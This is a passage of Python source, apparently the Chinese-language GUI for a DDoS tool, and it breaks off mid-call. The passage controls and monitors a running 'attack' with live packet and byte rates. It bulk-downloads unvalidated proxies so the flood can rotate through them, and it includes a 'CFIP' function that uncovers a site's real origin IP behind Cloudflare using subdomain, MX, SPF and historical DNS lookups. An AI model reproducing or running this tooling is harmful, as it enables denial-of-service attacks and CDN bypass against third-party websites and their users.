                if proxy_type == 0:
                    self.log("✓ 确认: 未使用代理，直接连接目标", "INFO")

            # 等待指定时间
            end_time = time() + duration
            while time() < end_time and self.attack_event.is_set():
                sleep(1)

            # 停止攻击
            self.log("正在停止攻击...")
            self.attack_event.clear()
            
            # 等待攻击线程响应停止信号（最多等待5秒）
            self.log("等待攻击线程停止...", "INFO")
            wait_time = 0
            max_wait = 5
            while wait_time < max_wait:
                # 检查是否还有活动线程（通过检查计数器是否还在增加）
                initial_requests = int(REQUESTS_SENT)
                initial_bytes = int(BYTES_SEND)
                sleep(0.5)
                wait_time += 0.5
                current_requests = int(REQUESTS_SENT)
                current_bytes = int(BYTES_SEND)
                
                # 如果计数器没有增加，说明线程可能已停止
                if current_requests == initial_requests and current_bytes == initial_bytes:
                    if wait_time >= 1.0:  # 至少等待1秒
                        break
                
                # 如果计数器还在增加，继续等待
                if current_requests > initial_requests or current_bytes > initial_bytes:
                    wait_time = 0  # 重置等待时间，因为还有活动
            
            self.log("攻击已停止", "INFO")

        except Exception as e:
            self.log(f"攻击执行错误: {e}", "ERROR")
        finally:
            # 确保状态正确更新
            self.is_attacking = False
            # 再次清除事件，确保所有线程都收到停止信号
            if self.attack_event:
                self.attack_event.clear()
            # 使用after_idle确保GUI更新在事件循环中执行
            self.root.after_idle(self._attack_finished)

    def _monitor_attack(self):
        """监控攻击状态"""
        # 使用双重检查，确保状态正确
        while self.is_attacking:
            # 再次检查，防止状态不同步
            if not self.is_attacking:
                break
            try:
                if self.start_time:
                    elapsed = time() - self.start_time
                    remaining = max(0, self.duration - elapsed)

                    # 更新运行时间
                    runtime_str = str(timedelta(seconds=int(elapsed)))
                    self.root.after(0, lambda: self.status_labels["runtime_status"].config(
                        text=runtime_str
                    ))

                    # 更新剩余时间
                    remaining_str = str(timedelta(seconds=int(remaining)))
                    self.root.after(0, lambda: self.status_labels["remaining_status"].config(
                        text=remaining_str
                    ))

                    # 更新进度
                    if self.duration > 0:
                        progress = min(100, (elapsed / self.duration) * 100)
                        self.root.after(0, lambda: self.progress_var.set(progress))

                    # 更新统计（读取当前值）
                    pps = int(REQUESTS_SENT)
                    bps = int(BYTES_SEND)
                    
                    # 诊断：如果持续为0，记录警告
                    if pps == 0 and bps == 0 and elapsed > 3:
                        # 只在第一次检测到持续为0时记录
                        if not hasattr(self, '_zero_stats_warned'):
                            self._zero_stats_warned = True
                            self.log("⚠️ 警告: 攻击运行超过3秒，PPS和BPS仍为0", "WARNING")
                            self.log("可能原因: 1) 代理连接失败  2) 目标无法连接  3) 方法不支持", "WARNING")
                            if hasattr(self, 'proxy_info') and self.proxy_info.get("using"):
                                self.log(f"代理状态: 使用 {self.proxy_info.get('count', 0)} 个代理", "WARNING")
                                self.log("建议: 检查代理文件或尝试不使用代理", "WARNING")
                    
                    # 累积总统计
                    if not hasattr(self, '_total_requests'):
                        self._total_requests = 0
                        self._total_bytes = 0
                    self._total_requests += pps
                    self._total_bytes += bps

                    # 更新UI（使用lambda捕获当前值）
                    pps_val = pps
                    bps_val = bps
                    self.root.after(0, lambda p=pps_val: self.stats_labels["pps_stats"].config(
                        text=Tools.humanformat(p)
                    ))
                    self.root.after(0, lambda b=bps_val: self.stats_labels["bps_stats"].config(
                        text=Tools.humanbytes(b)
                    ))
                    self.root.after(0, lambda: self.stats_labels["total_requests"].config(
                        text=Tools.humanformat(self._total_requests)
                    ))
                    self.root.after(0, lambda: self.stats_labels["total_bytes"].config(
                        text=Tools.humanbytes(self._total_bytes)
                    ))
                    
                    # 更新代理使用率（如果有代理）
                    if hasattr(self, 'proxy_info') and self.proxy_info.get("using"):
                        proxy_count = self.proxy_info.get("count", 0)
                        if proxy_count > 0:
                            # 估算代理使用率（基于PPS和代理数量）
                            # 假设每个代理每秒可以处理10-50个请求
                            estimated_proxy_usage = min(100, (pps / proxy_count) * 100 / 10) if pps > 0 else 0
                            self.root.after(0, lambda u=estimated_proxy_usage: self.stats_labels["proxy_usage"].config(
                                text=f"{u:.1f}%", foreground="green"
                            ))
                            
                            # 更新代理性能统计
                            # 平均负载：每个代理平均处理的请求数
                            avg_load = pps / proxy_count if proxy_count > 0 else 0
                            self.root.after(0, lambda a=avg_load: self.proxy_stats_labels["proxy_avg_load"].config(
                                text=f"{a:.2f} 请求/代理/秒", foreground="blue"
                            ))
                            
                            # 估算带宽：基于BPS和代理数量
                            estimated_bw_per_proxy = bps / proxy_count if proxy_count > 0 else 0
                            self.root.after(0, lambda b=estimated_bw_per_proxy: self.proxy_stats_labels["proxy_estimated_bw"].config(
                                text=f"{Tools.humanbytes(int(b))}/代理", foreground="blue"
                            ))
                        else:
                            self.root.after(0, lambda: self.stats_labels["proxy_usage"].config(
                                text="N/A", foreground="gray"
                            ))
                            self.root.after(0, lambda: self.proxy_stats_labels["proxy_avg_load"].config(
                                text="-", foreground="gray"
                            ))
                            self.root.after(0, lambda: self.proxy_stats_labels["proxy_estimated_bw"].config(
                                text="-", foreground="gray"
                            ))
                    else:
                        self.root.after(0, lambda: self.stats_labels["proxy_usage"].config(
                            text="未使用", foreground="gray"
                        ))
                        self.root.after(0, lambda: self.proxy_stats_labels["proxy_avg_load"].config(
                            text="-", foreground="gray"
                        ))
                        self.root.after(0, lambda: self.proxy_stats_labels["proxy_estimated_bw"].config(
                            text="-", foreground="gray"
                        ))

                    # 重置计数器（每秒重置一次）
                    REQUESTS_SENT.set(0)
                    BYTES_SEND.set(0)

                sleep(1)
            except Exception as e:
                self.log(f"监控错误: {e}", "ERROR")
                break

    def _attack_finished(self):
        """攻击结束回调"""
        # 确保状态标志已设置
        self.is_attacking = False
        
        # 确保事件已清除
        if self.attack_event:
            self.attack_event.clear()
        
        # 更新UI状态
        try:
            self.start_button.config(state=tk.NORMAL)
            self.stop_button.config(state=tk.DISABLED)
            self.status_labels["attack_status"].config(text="已停止", foreground="red")
            self.progress_var.set(0)
            
            # 重置统计标签
            self.stats_labels["pps_stats"].config(text="0", foreground="gray")
            self.stats_labels["bps_stats"].config(text="0 B", foreground="gray")
            
            # 清空运行时间和剩余时间
            self.status_labels["runtime_status"].config(text="00:00:00")
            self.status_labels["remaining_status"].config(text="00:00:00")
        except Exception as e:
            # 如果更新UI失败，记录错误但不影响程序运行
            print(f"更新UI状态错误: {e}")

    def stop_attack(self):
        """停止攻击"""
        if not self.is_attacking:
            return  # 如果已经停止，直接返回
        
        self.log("正在停止攻击...", "INFO")
        
        # 先设置标志，防止新的操作
        self.is_attacking = False
        
        # 清除事件，通知所有攻击线程停止
        if self.attack_event:
            self.attack_event.clear()
        
        # 等待一小段时间，让线程有机会响应
        sleep(0.5)
        
        # 更新UI状态
        self._attack_finished()
        
        self.log("攻击已停止", "INFO")

    def run_tool(self):
        """运行工具"""
        tool = self.tool_var.get()
        input_val = self.tool_input_var.get().strip()

        if not tool:
            messagebox.showerror("错误", "请选择工具")
            return

        if not input_val:
            messagebox.showerror("错误", "请输入地址/域名")
            return

        # 在后台线程中运行工具
        threading.Thread(
            target=self._execute_tool,
            args=(tool, input_val),
            daemon=True
        ).start()

    def _execute_tool(self, tool: str, input_val: str):
        """执行工具（在后台线程中运行）"""
        try:
            self.root.after(0, lambda: self.tool_output.insert(tk.END, f"执行工具: {tool} -> {input_val}\n"))
            self.root.after(0, lambda: self.tool_output.see(tk.END))

            if tool == "PING":
                from start import ping
                result = ping(input_val, count=5, interval=0.2)
                output = f"地址: {result.address}\n"
                output += f"平均延迟: {result.avg_rtt}ms\n"
                output += f"接收包数: {result.packets_received}/{result.packets_sent}\n"
                output += f"状态: {'在线' if result.is_alive else '离线'}\n"
                self.root.after(0, lambda: self.tool_output.insert(tk.END, output + "\n"))
                self.root.after(0, lambda: self.tool_output.see(tk.END))

            elif tool == "CHECK":
                from start import get
                r = get(input_val, timeout=20)
                output = f"状态码: {r.status_code}\n"
                output += f"状态: {'在线' if r.status_code <= 500 else '离线'}\n"
                self.root.after(0, lambda: self.tool_output.insert(tk.END, output + "\n"))
                self.root.after(0, lambda: self.tool_output.see(tk.END))

            elif tool == "INFO":
                info = ToolsConsole.info(input_val)
                if info.get("success"):
                    output = f"国家: {info.get('country', 'N/A')}\n"
                    output += f"城市: {info.get('city', 'N/A')}\n"
                    output += f"组织: {info.get('org', 'N/A')}\n"
                    output += f"ISP: {info.get('isp', 'N/A')}\n"
                    output += f"地区: {info.get('region', 'N/A')}\n"
                else:
                    output = "查询失败\n"
                self.root.after(0, lambda: self.tool_output.insert(tk.END, output + "\n"))
                self.root.after(0, lambda: self.tool_output.see(tk.END))

            elif tool == "TSSRV":
                info = ToolsConsole.ts_srv(input_val)
                output = f"TCP: {info.get('_tsdns._tcp.', 'N/A')}\n"
                output += f"UDP: {info.get('_ts3._udp.', 'N/A')}\n"
                self.root.after(0, lambda: self.tool_output.insert(tk.END, output + "\n"))
                self.root.after(0, lambda: self.tool_output.see(tk.END))

            elif tool == "DNS":
                # DNS记录查询
                domain = input_val.replace('https://', '').replace('http://', '').split('/')[0].strip()
                output = f"DNS记录查询: {domain}\n"
                output += "=" * 50 + "\n"
                
                try:
                    from dns import resolver
                    from dns.exception import DNSException
                    
                    dns_resolver = resolver.Resolver()
                    dns_resolver.timeout = 5
                    dns_resolver.lifetime = 10
                    
                    # A记录
                    try:
                        a_records = dns_resolver.resolve(domain, 'A')
                        output += f"\nA记录 (IPv4):\n"
                        for rdata in a_records:
                            output += f"  {rdata.address}\n"
                    except DNSException:
                        output += f"\nA记录: 未找到\n"
                    
                    # AAAA记录 (IPv6)
                    try:
                        aaaa_records = dns_resolver.resolve(domain, 'AAAA')
                        output += f"\nAAAA记录 (IPv6):\n"
                        for rdata in aaaa_records:
                            output += f"  {rdata.address}\n"
                    except DNSException:
                        output += f"\nAAAA记录: 未找到\n"
                    
                    # CNAME记录
                    try:
                        cname_records = dns_resolver.resolve(domain, 'CNAME')
                        output += f"\nCNAME记录:\n"
                        for rdata in cname_records:
                            output += f"  {rdata.target}\n"
                    except DNSException:
                        pass
                    
                    # MX记录
                    try:
                        mx_records = dns_resolver.resolve(domain, 'MX')
                        output += f"\nMX记录 (邮件服务器):\n"
                        for rdata in sorted(mx_records, key=lambda x: x.preference):
                            output += f"  {rdata.preference} {rdata.exchange}\n"
                    except DNSException:
                        pass
                    
                    # NS记录
                    try:
                        ns_records = dns_resolver.resolve(domain, 'NS')
                        output += f"\nNS记录 (域名服务器):\n"
                        for rdata in ns_records:
                            output += f"  {rdata.target}\n"
                    except DNSException:
                        pass
                    
                    # TXT记录
                    try:
                        txt_records = dns_resolver.resolve(domain, 'TXT')
                        output += f"\nTXT记录:\n"
                        for rdata in txt_records:
                            output += f"  {''.join(rdata.strings)}\n"
                    except DNSException:
                        pass
                    
                    # SOA记录
                    try:
                        soa_records = dns_resolver.resolve(domain, 'SOA')
                        output += f"\nSOA记录:\n"
                        for rdata in soa_records:
                            output += f"  主服务器: {rdata.mname}\n"
                            output += f"  管理员: {rdata.rname}\n"
                            output += f"  序列号: {rdata.serial}\n"
                            output += f"  刷新: {rdata.refresh}秒\n"
                            output += f"  重试: {rdata.retry}秒\n"
                            output += f"  过期: {rdata.expire}秒\n"
                            output += f"  最小TTL: {rdata.minimum}秒\n"
                    except DNSException:
                        pass
                    
                except Exception as e:
                    output += f"\n错误: {e}\n"
                
                self.root.after(0, lambda: self.tool_output.insert(tk.END, output + "\n"))
                self.root.after(0, lambda: self.tool_output.see(tk.END))

            elif tool == "CFIP":
                # 查找Cloudflare后的真实IP
                domain = input_val.replace('https://', '').replace('http://', '').split('/')[0].strip()
                output = f"查找Cloudflare后的真实IP: {domain}\n"
                output += "=" * 50 + "\n"
                output += "正在检查...\n\n"
                
                real_ips = set()
                
                try:
                    from dns import resolver
                    from dns.exception import DNSException
                    from start import get
                    import re
                    
                    dns_resolver = resolver.Resolver()
                    dns_resolver.timeout = 5
                    dns_resolver.lifetime = 10
                    
                    ip_pattern = r'\b(?:\d{1,3}\.){3}\d{1,3}\b'  # IP地址正则表达式
                    
                    # 方法1: 检查主域名的A记录
                    try:
                        a_records = dns_resolver.resolve(domain, 'A')
                        for rdata in a_records:
                            ip = rdata.address
                            # 检查是否是Cloudflare IP
                            if not self._is_cloudflare_ip(ip):
                                real_ips.add(ip)
                                output += f"✓ 从A记录找到: {ip}\n"
                    except DNSException:
                        pass
                    
                    # 方法2: 检查常见子域名
                    common_subdomains = ['www', 'mail', 'ftp', 'direct', 'cpanel', 'webmail', 
                                       'admin', 'blog', 'dev', 'test', 'staging', 'old', 'new',
                                       'origin', 'origin-www', 'origin-http', 'origin-https']
                    
                    output += "\n检查常见子域名...\n"
                    for subdomain in common_subdomains[:10]:  # 限制检查数量
                        try:
                            subdomain_full = f"{subdomain}.{domain}"
                            a_records = dns_resolver.resolve(subdomain_full, 'A')
                            for rdata in a_records:
                                ip = rdata.address
                                if not self._is_cloudflare_ip(ip):
                                    real_ips.add(ip)
                                    output += f"✓ 从 {subdomain_full} 找到: {ip}\n"
                        except DNSException:
                            pass
                    
                    # 方法3: 检查MX记录（邮件服务器）
                    output += "\n检查邮件服务器...\n"
                    try:
                        mx_records = dns_resolver.resolve(domain, 'MX')
                        for rdata in mx_records:
                            try:
                                mx_a = dns_resolver.resolve(str(rdata.exchange).rstrip('.'), 'A')
                                for mx_ip in mx_a:
                                    ip = mx_ip.address
                                    if not self._is_cloudflare_ip(ip):
                                        real_ips.add(ip)
                                        output += f"✓ 从邮件服务器 {rdata.exchange} 找到: {ip}\n"
                            except DNSException:
                                pass
                    except DNSException:
                        pass
                    
                    # 方法4: 检查历史记录（通过第三方服务）
                    output += "\n检查历史DNS记录...\n"
                    try:
                        # 使用viewdns.info API（免费）
                        history_url = f"https://viewdns.info/iphistory/?domain={domain}"
                        response = get(history_url, timeout=10, headers={
                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                        })
                        # 简单提取IP（实际应该解析HTML）
                        ip_pattern = r'\b(?:\d{1,3}\.){3}\d{1,3}\b'
                        found_ips = re.findall(ip_pattern, response.text)
                        for ip in found_ips[:5]:  # 限制数量
                            if not self._is_cloudflare_ip(ip) and self._is_valid_ip(ip):
                                real_ips.add(ip)
                                output += f"✓ 从历史记录找到: {ip}\n"
                    except Exception:
                        pass
                    
                    # 方法5: 检查SPF记录中的IP
                    output += "\n检查SPF记录...\n"
                    try:
                        txt_records = dns_resolver.resolve(domain, 'TXT')
                        for rdata in txt_records:
                            txt_str = ''.join(rdata.strings)
                            if 'v=spf1' in txt_str.lower():
                                # 提取IP
                                spf_ips = re.findall(ip_pattern, txt_str)
                                for ip in spf_ips:
                                    if not self._is_cloudflare_ip(ip) and self._is_valid_ip(ip):
                                        real_ips.add(ip)
                                        output += f"✓ 从SPF记录找到: {ip}\n"
                    except DNSException:
                        pass
                    
                    # 总结
                    output += "\n" + "=" * 50 + "\n"
                    if real_ips:
                        output += f"找到 {len(real_ips)} 个可能的真实IP:\n"
                        for ip in real_ips:
                            output += f"  • {ip}\n"
                    else:
                        output += "未找到明确的真实IP地址\n"
                        output += "提示: 网站可能完全隐藏在Cloudflare后面\n"
                        output += "      或者使用了其他CDN服务\n"
                    
                except Exception as e:
                    output += f"\n错误: {e}\n"
                
                self.root.after(0, lambda: self.tool_output.insert(tk.END, output + "\n"))
                self.root.after(0, lambda: self.tool_output.see(tk.END))

            elif tool == "DSTAT":
                from start import net_io_counters, cpu_percent, virtual_memory
                import psutil

                output = "系统统计信息（每秒更新）:\n"
                output += "按Ctrl+C停止\n\n"

                last = net_io_counters(pernic=False)
                try:
                    while True:
                        sleep(1)
                        current = net_io_counters(pernic=False)
                        diff = [
                            current.bytes_sent - last.bytes_sent,
                            current.bytes_recv - last.bytes_recv,
                            current.packets_sent - last.packets_sent,
                            current.packets_recv - last.packets_recv,
                        ]

                        output = f"发送字节: {Tools.humanbytes(diff[0])}/s\n"
                        output += f"接收字节: {Tools.humanbytes(diff[1])}/s\n"
                        output += f"发送包: {Tools.humanformat(diff[2])}/s\n"
                        output += f"接收包: {Tools.humanformat(diff[3])}/s\n"
                        output += f"CPU使用率: {cpu_percent()}%\n"
                        output += f"内存使用率: {virtual_memory().percent}%\n"

                        self.root.after(0, lambda: self.tool_output.delete(1.0, tk.END))
                        self.root.after(0, lambda: self.tool_output.insert(tk.END, output))
                        last = current
                except KeyboardInterrupt:
                    pass

            else:
                self.root.after(0, lambda: self.tool_output.insert(
                    tk.END, f"未知工具: {tool}\n"
                ))

        except Exception as e:
            import traceback
            error_msg = f"错误: {e}\n{traceback.format_exc()}\n"
            self.root.after(0, lambda: self.tool_output.insert(
                tk.END, error_msg
            ))

    def _is_cloudflare_ip(self, ip: str) -> bool:
        """检查IP是否是Cloudflare的IP"""
        # Cloudflare的IP段（部分主要段）
        cloudflare_ranges = [
            "104.16.0.0/12",
            "172.64.0.0/13",
            "173.245.48.0/20",
            "103.21.244.0/22",
            "103.22.200.0/22",
            "103.31.4.0/22",
            "141.101.64.0/18",
            "108.162.192.0/18",
            "190.93.240.0/20",
            "188.114.96.0/20",
            "197.234.240.0/22",
            "198.41.128.0/17",
            "162.158.0.0/15",
            "104.16.0.0/13",
            "172.64.0.0/13",
            "131.0.72.0/22",
        ]
        
        try:
            from ipaddress import ip_address, ip_network
            ip_obj = ip_address(ip)
            for cidr in cloudflare_ranges:
                if ip_obj in ip_network(cidr, strict=False):
                    return True
        except Exception:
            pass
        
        return False

    def _is_valid_ip(self, ip: str) -> bool:
        """检查是否是有效的IP地址"""
        try:
            from ipaddress import ip_address
            ip_address(ip)
            return True
        except Exception:
            return False

    def download_proxies(self):
        """下载代理（带代理源选择）"""
        proxy_type_str = self.proxy_download_type_var.get().split("=")[0]
        try:
            proxy_type = int(proxy_type_str)
        except ValueError:
            proxy_type = 0

        proxy_file = self.proxy_manage_file_var.get()
        proxy_li = __dir__ / "files" / "proxies" / proxy_file

        # 获取所有代理源
        all_providers = con.get("proxy-providers", [])
        if not all_providers:
            messagebox.showerror("错误", "配置文件中没有代理源")
            return
        
        # 根据代理类型过滤
        filtered_providers = [
            (idx, p) for idx, p in enumerate(all_providers)
            if p.get("type") == proxy_type or proxy_type == 0
        ]
        
        if not filtered_providers:
            messagebox.showwarning("警告", f"没有找到类型为 {proxy_type_str} 的代理源")
            return

        # 创建代理源选择对话框
        source_dialog = tk.Toplevel(self.root)
        source_dialog.title("选择代理源")
        source_dialog.geometry("700x500")
        source_dialog.transient(self.root)
        source_dialog.grab_set()

        # 居中显示
        source_dialog.update_idletasks()
        x = (source_dialog.winfo_screenwidth() // 2) - (source_dialog.winfo_width() // 2)
        y = (source_dialog.winfo_screenheight() // 2) - (source_dialog.winfo_height() // 2)
        source_dialog.geometry(f"+{x}+{y}")

        ttk.Label(
            source_dialog,
            text=f"选择要使用的代理源（代理类型: {proxy_type_str}）",
            font=("", 10, "bold")
        ).pack(pady=10)

        # 创建滚动框架
        canvas = tk.Canvas(source_dialog)
        scrollbar = ttk.Scrollbar(source_dialog, orient="vertical", command=canvas.yview)
        scrollable_frame = ttk.Frame(canvas)

        scrollable_frame.bind(
            "<Configure>",
            lambda e: canvas.configure(scrollregion=canvas.bbox("all"))
        )

        canvas.create_window((0, 0), window=scrollable_frame, anchor="nw")
        canvas.configure(yscrollcommand=scrollbar.set)

        # 全选/全不选按钮
        button_frame = ttk.Frame(source_dialog)
        button_frame.pack(fill=tk.X, padx=10, pady=5)
        
        selected_vars = {}
        
        def select_all():
            for var in selected_vars.values():
                var.set(True)
        
        def deselect_all():
            for var in selected_vars.values():
                var.set(False)
        
        ttk.Button(button_frame, text="全选", command=select_all).pack(side=tk.LEFT, padx=5)
        ttk.Button(button_frame, text="全不选", command=deselect_all).pack(side=tk.LEFT, padx=5)

        # 代理源列表
        list_frame = ttk.Frame(scrollable_frame)
        list_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)

        for idx, provider in filtered_providers:
            var = tk.BooleanVar(value=True)  # 默认全部选中
            selected_vars[idx] = var
            
            provider_name = provider.get("name", "")
            provider_url = provider.get("url", "")
            provider_type = provider.get("type", 0)
            type_name = {1: "HTTP", 4: "SOCKS4", 5: "SOCKS5"}.get(provider_type, "Unknown")
            
            # 显示名称或URL（截断长URL）
            display_name = provider_name if provider_name else provider_url
            if len(display_name) > 60:
                display_name = display_name[:57] + "..."
            
            frame = ttk.Frame(list_frame)
            frame.pack(fill=tk.X, pady=2)
            
            ttk.Checkbutton(
                frame,
                text=f"[{type_name}] {display_name}",
                variable=var
            ).pack(side=tk.LEFT, anchor=tk.W)
            
            # 显示完整URL（工具提示）
            if provider_url:
                ToolTip(frame, provider_url)

        canvas.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)

        # 按钮
        button_frame2 = ttk.Frame(source_dialog)
        button_frame2.pack(pady=20)

        enabled_providers = None

        def on_ok():
            nonlocal enabled_providers
            # 获取选中的代理源索引
            enabled_indices = [idx for idx, var in selected_vars.items() if var.get()]
            if not enabled_indices:
                messagebox.showwarning("警告", "请至少选择一个代理源")
                return
            enabled_providers = enabled_indices
            source_dialog.destroy()

        def on_cancel():
            source_dialog.destroy()

        ttk.Button(button_frame2, text="确定", command=on_ok).pack(side=tk.LEFT, padx=10)
        ttk.Button(button_frame2, text="取消", command=on_cancel).pack(side=tk.LEFT, padx=10)

        # 等待对话框关闭
        source_dialog.wait_window()

        # 如果用户取消了，直接返回
        if enabled_providers is None:
            return

        # 显示选中的源数量
        selected_count = len(enabled_providers)
        total_count = len(filtered_providers)
        
        self.log(f"开始下载代理 (类型: {proxy_type}, 文件: {proxy_file})")
        self.log(f"已选择 {selected_count}/{total_count} 个代理源", "INFO")
        self.log("策略: 数量优先，不验证，直接保存所有代理", "INFO")
        self.log("提示: 攻击时会自动尝试多个代理，快速失败快速重试", "INFO")

        threading.Thread(
            target=self._download_proxies_thread,
            args=(proxy_type, proxy_li, enabled_providers),
            daemon=True
        ).start()

    def _quick_download_proxy(self, provider, proxy_type):
        """快速下载单个代理源（不带验证，支持JSON格式）"""
        from start import ProxyUtiles
        from start import get, exceptions
        from json import loads
        
        proxies_set = set()
        try:
            response = get(provider["url"], timeout=min(provider.get("timeout", 5), 3))
            if response.status_code == 200:
                # 检查是否是JSON格式的API响应（proxy.scdn.io）
                try:
                    json_data = response.json()
                    if isinstance(json_data, dict) and "data" in json_data:
                        # 处理proxy.scdn.io的JSON格式
                        if "proxies" in json_data["data"]:
                            proxies_list = json_data["data"]["proxies"]
                            for proxy_str in proxies_list:
                                try:
                                    # 解析 "IP:PORT" 格式
                                    proxy = ProxyUtiles.parseAllIPPort(
                                        [proxy_str], proxy_type
                                    )
                                    proxies_set.update(proxy)
                                except Exception:
                                    pass
                            return proxies_set
                except (ValueError, KeyError):
                    # 不是JSON格式，按文本处理
                    pass
                
                # 处理文本格式（原有逻辑）
                data = response.text
                for proxy in ProxyUtiles.parseAllIPPort(data.splitlines(), proxy_type):
                    proxies_set.add(proxy)
        except Exception:
            pass
        return proxies_set

    def _download_proxies_thread(self, proxy_type: int, proxy_li: Path, enabled_providers: list = None):
        """下载代理线程（不验证，直接保存所有代理）
        
        Args:
            proxy_type: 代理类型
            proxy_li: 代理文件路径
            enabled_providers: 启用的代理源列表（None表示全部启用）
        """
        try:
            from start import ProxyManager, ProxyType

            if enabled_providers:
                self.root.after(0, lambda: self.log(f"开始从 {len(enabled_providers)} 个选定的代理源下载...", "INFO"))
            else:
                self.root.after(0, lambda: self.log(f"开始从配置源下载代理...", "INFO"))
            
            # 下载代理
            proxies = None
            try:
                proxies = ProxyManager.DownloadFromConfig(con, proxy_type, enabled_providers)
            except Exception as e:
                err_msg = str(e)
                self.root.after(0, lambda msg=err_msg: self.log(f"下载代理时出错: {msg}", "WARNING"))
                return
            
            if not proxies:
                self.root.after(0, lambda: self.log("未下载到任何代理", "WARNING"))
                return
                
            proxy_count = len(proxies)
            self.root.after(0, lambda c=proxy_count: self.log(f"下载了 {c:,} 个代理，跳过验证直接保存（数量优先策略）", "INFO"))
            self.root.after(0, lambda: self.log("说明: 攻击时会自动尝试多个代理，快速失败快速重试，无需预先验证", "INFO"))
            
            # 直接保存所有代理，不进行验证
            # 原因：
            # 1. 验证过程耗时很长（特别是大量代理）
            # 2. 攻击时已有快速失败和重试机制（最多尝试5个代理）
            # 3. 数量优先：代理足够多时，即使部分失效也能找到可用的
            proxy_li.parent.mkdir(parents=True, exist_ok=True)
            with proxy_li.open("w", encoding="utf-8") as f:
                for proxy in proxies:
                    f.write(str(proxy) + "\n")

            self.root.after(0, lambda c=proxy_count: self.log(f"✓ 代理保存完成，共 {c:,} 个代理（未验证）", "INFO"))
            self.root.after(0, lambda: self.log("提示: 如需验证代理质量，可使用'检查代理'功能", "INFO"))
            self.root.after(0, self.refresh_proxy_list)

        except Exception as e:
            err_msg = str(e)
            self.root.after(0, lambda msg=err_msg: self.log(f"下载代理错误: {msg}", "ERROR"))

    def check_proxies(self):
        """检查代理（基础验证）"""
        proxy_file = self.proxy_manage_file_var.get()
        proxy_li = __dir__ / "files" / "proxies" / proxy_file

        if not proxy_li.exists():
            messagebox.showerror("错误", "代理文件不存在")
            return

        # 读取代理文件，获取代理数量
        try:
            from start import ProxyUtiles
            proxies = ProxyUtiles.readFromFile(proxy_li)
            proxy_count = len(proxies)
        except Exception:
            proxy_count = 0

        if proxy_count == 0:
            messagebox.showwarning("警告", "代理文件为空")
            return

        # 询问用户检查方式
        check_dialog = tk.Toplevel(self.root)
        check_dialog.title("代理检查选项")
        check_dialog.geometry("450x250")
        check_dialog.transient(self.root)
        check_dialog.grab_set()

        # 居中显示
        check_dialog.update_idletasks()
        x = (check_dialog.winfo_screenwidth() // 2) - (check_dialog.winfo_width() // 2)
        y = (check_dialog.winfo_screenheight() // 2) - (check_dialog.winfo_height() // 2)
        check_dialog.geometry(f"+{x}+{y}")

        ttk.Label(
            check_dialog,
            text=f"代理文件: {proxy_file}\n代理总数: {proxy_count:,} 个",
            font=("", 10, "bold")
        ).pack(pady=10)

        # 选择检查方式
        check_mode = tk.StringVar(value="all")
        
        mode_frame = ttk.LabelFrame(check_dialog, text="检查方式", padding=10)
        mode_frame.pack(fill=tk.X, padx=20, pady=10)

        ttk.Radiobutton(
            mode_frame,
            text=f"检查所有代理 ({proxy_count:,} 个)",
            variable=check_mode,
            value="all"
        ).pack(anchor=tk.W, pady=5)

        ttk.Radiobutton(
            mode_frame,
            text="只检查前 N 个代理",
            variable=check_mode,
            value="limit"
        ).pack(anchor=tk.W, pady=5)

        # 数量输入框
        limit_frame = ttk.Frame(mode_frame)
        limit_frame.pack(fill=tk.X, pady=5, padx=20)

        ttk.Label(limit_frame, text="检查数量:").pack(side=tk.LEFT, padx=5)
        limit_var = tk.StringVar(value=str(min(10000, proxy_count)))
        limit_entry = ttk.Entry(limit_frame, textvariable=limit_var, width=15)
        limit_entry.pack(side=tk.LEFT, padx=5)
        ttk.Label(limit_frame, text="个").pack(side=tk.LEFT, padx=5)

        # 根据选择启用/禁用输入框
        def on_mode_change():
            if check_mode.get() == "limit":
                limit_entry.config(state=tk.NORMAL)
            else:
                limit_entry.config(state=tk.DISABLED)

        check_mode.trace("w", lambda *args: on_mode_change())
        on_mode_change()

        # 按钮
        button_frame = ttk.Frame(check_dialog)
        button_frame.pack(pady=20)

        max_check = None

        def on_ok():
            nonlocal max_check
            if check_mode.get() == "all":
                max_check = None  # None表示检查所有
            else:
                try:
                    limit = int(limit_var.get().strip())
                    if limit <= 0:
                        messagebox.showerror("错误", "检查数量必须大于0")
                        return
                    if limit > proxy_count:
                        limit = proxy_count
                    max_check = limit
                except ValueError:
                    messagebox.showerror("错误", "请输入有效的数字")
                    return
            check_dialog.destroy()

        def on_cancel():
            check_dialog.destroy()

        ttk.Button(button_frame, text="确定", command=on_ok).pack(side=tk.LEFT, padx=10)
        ttk.Button(button_frame, text="取消", command=on_cancel).pack(side=tk.LEFT, padx=10)

        # 等待对话框关闭
        check_dialog.wait_window()

        # 如果用户取消了，直接返回
        if max_check is None and check_mode.get() != "all":
            return

        # 显示检查信息
        if max_check is None:
            self.log(f"开始检查代理: {proxy_file} (检查所有 {proxy_count:,} 个代理)")
        else:
            self.log(f"开始检查代理: {proxy_file} (检查前 {max_check:,} 个代理)")

        threading.Thread(
            target=self._check_proxies_thread,
            args=(proxy_li, max_check),
            daemon=True
        ).start()
    
    def advanced_check_proxies(self):
        """高级代理质量检查"""
        proxy_file = self.proxy_manage_file_var.get()
        proxy_li = __dir__ / "files" / "proxies" / proxy_file

        if not proxy_li.exists():
            messagebox.showerror("错误", "代理文件不存在")
            return
        
        # 询问目标地址（可选）
        target = simpledialog.askstring(
            "高级代理检查",
            "输入目标地址进行特定验证（可选）:\n"
            "格式: IP:端口 或 域名:端口\n"
            "留空则使用通用验证URL\n\n"
            "例如: 192.168.1.100:80 或 example.com:443",
            initialvalue=""
        )
        
        if target is None:  # 用户取消
            return
        
        # 询问质量阈值
        threshold = simpledialog.askstring(
            "质量阈值",
            "设置质量阈值（0-100）:\n"
            "只保留质量分数 >= 阈值的代理\n\n"
            "建议值:\n"
            "• 严格筛选: 70-80\n"
            "• 中等筛选: 50-60\n"
            "• 宽松筛选: 30-40\n\n"
            "留空则保留所有验证通过的代理",
            initialvalue="50"
        )
        
        if threshold is None:  # 用户取消
            return
        
        try:
            quality_threshold = int(threshold) if threshold.strip() else 0
        except ValueError:
            quality_threshold = 0
        
        self.log(f"开始高级代理质量检查: {proxy_file}")
        if target:
            self.log(f"目标地址: {target}")
        if quality_threshold > 0:
            self.log(f"质量阈值: {quality_threshold}")

        threading.Thread(
            target=self._advanced_check_proxies_thread,
